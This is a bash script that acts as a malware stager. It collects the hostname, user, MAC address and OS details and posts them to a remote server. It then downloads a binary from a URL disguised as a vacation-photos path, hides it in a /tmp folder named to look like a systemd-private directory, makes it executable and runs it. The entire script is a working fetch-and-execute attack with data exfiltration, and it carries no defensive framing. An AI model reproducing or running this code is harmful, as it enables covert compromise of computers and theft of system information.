#!/bin/bash
ip="0.0.0.0"
bin_name="test"
url="http://$ip:3000/vacances/photos/$bin_name"

hostname=$(hostname)
user=$(whoami)
mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
os=$(uname -s)
os_version=$(uname -v)

# Manually construct JSON
jsoninfo="{\"hostname\":\"$hostname\", \"users\":\"$user\", \"mac\":\"$mac\", \"os\":\"$os\", \"os_version\":\"$os_version\"}"

# Specify the URL
json_url="http://$ip:3000/get-info"

# Send the JSON data using curl
curl -X POST "$json_url" -H "Content-Type: application/json" -d "$jsoninfo"

mkdir /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db
curl $url -o /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/$bin_name

chmod +x /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/$bin_name && /tmp/systemd-private-834ec7a7eaad85298742f8f1251601db/$bin_name